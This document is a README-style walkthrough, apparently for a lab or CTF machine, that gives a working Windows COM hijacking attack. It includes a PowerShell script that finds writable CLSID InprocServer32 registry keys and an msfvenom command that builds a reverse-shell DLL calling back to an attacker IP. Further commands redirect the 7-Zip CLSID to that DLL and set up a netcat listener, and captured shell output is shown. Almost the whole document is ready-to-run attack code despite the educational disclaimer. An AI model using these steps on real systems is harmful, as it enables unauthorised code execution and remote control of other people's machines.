# windows-dll-hijack-clsid
Powershell script to find writable CLSIDs and then DLL Hijacking it

* ### Steps:
1) Let's first create a powershell script to find vulnerable CLSID keys, we'll call it as `find_writable_clsid.ps1`: 
```powershell
# Let's obtain all the current user's groups first by their name, not SID:
$myIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$myGroups = $myIdentity.Groups | ForEach-Object {
    try {
        $_.Translate([System.Security.Principal.NTAccount]).Value
    } catch {
        $_.Value
    }
}
$myGroups += $myIdentity.Name  # Add the user directly

# Let's iterate all CLSID keys:
$base = "HKLM:\Software\Classes\CLSID"
$clsids = Get-ChildItem -Path $base -ErrorAction SilentlyContinue

foreach ($clsid in $clsids) {
    $inprocPath = Join-Path $clsid.PSPath "InprocServer32"
    
    if (Test-Path $inprocPath) {
        try {
            $acl = Get-Acl $inprocPath
            foreach ($access in $acl.Access) {
                $identity = $access.IdentityReference.Value
                $rights = $access.RegistryRights

                # Does the current user or group have WRITE PERMISSIONS (W or RW)?:
                if ($myGroups -contains $identity -and $rights -match "SetValue|WriteKey|FullControl") {
                    Write-Host "[PWN] Writable CLSID found!"
                    Write-Host "      Key: $inprocPath"
                    Write-Host "      Who: $identity"
                    Write-Host "      Rights: $rights`n"
                }
            }
        } catch {
            continue
        }
    }
}
```

2) We execute it and we find one vulnerable CLSID key (in this case the current user belongs to `RAGNAROK\Support` group, so we have RW rights, we have FullControl over it to write it):
```powershell
PS C:\users\public> .\find_writable_clsid.ps1

[PWN] Writable CLSID found!
      Key: Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
      Who: RAGNAROK\Support
      Rights: FullControl
```

3) Once you find a vulnerable CLSID key, it's time to check where it comes from, in this case it says this below -> `(default)      : C:\Program Files\7-Zip\7-zip.dll`:
```powershell
PS C:\Users\Public> Get-ItemProperty -Path "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32"


(default)      : C:\Program Files\7-Zip\7-zip.dll
ThreadingModel : Apartment
PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000
                 -000100020000}\InprocServer32
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{23170F69-40C1-278A-1000
                 -000100020000}
PSChildName    : InprocServer32
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry
```

4) Now let's create our malicious DLL as `hijack.dll` in our attack machine (then send it to the target machine with the technique of your choice):
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o hijack.dll
```   
   
5) Now let's replace the default value to our malicious DLL (this time we are using this route to upload the file `C:\Users\Public`, but it may be different):
```powershell
PS C:\users\public> Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" -Name "(default)" -Value "C:\Users\Public\hijack.dll"

# This won't show any output!!!
```

6)  Let's have our listener on in our attacking machine:
```bash
rlwrap nc -nlvp 4444
```

7) We can execute the malicious DLL with it: 
```powershell
PS C:\users\public> start-process explorer.exe
```

 You may also execute it in this case with the 7-zip file inside it's folder as we know this has the vulnerable CLSID key:
 ```powershell
 PS C:\program files\7-zip> .\7z.exe`
 ```
 
 8) We receive the shell in our attacking machine:
```bash
rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.100.159] 49980
Microsoft Windows [Version 10.0.17763.7434]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> whoami
whoami
ragnarok\mm.harper
PS C:\Windows> 
```


##### EXTRA: Here you can find a video to another DLL Hijacking technique using procmon.exe https://www.youtube.com/watch?v=XvxeUxOvKb0


> ### ⚠️ **DISCLAIMER**  
> ##### This project is intended for **educational and research purposes only**, to be used in **controlled environments** by **authorized penetration testers**.  
> ##### The creator assumes **no responsibility** for any misuse or damage caused by the use of this code.

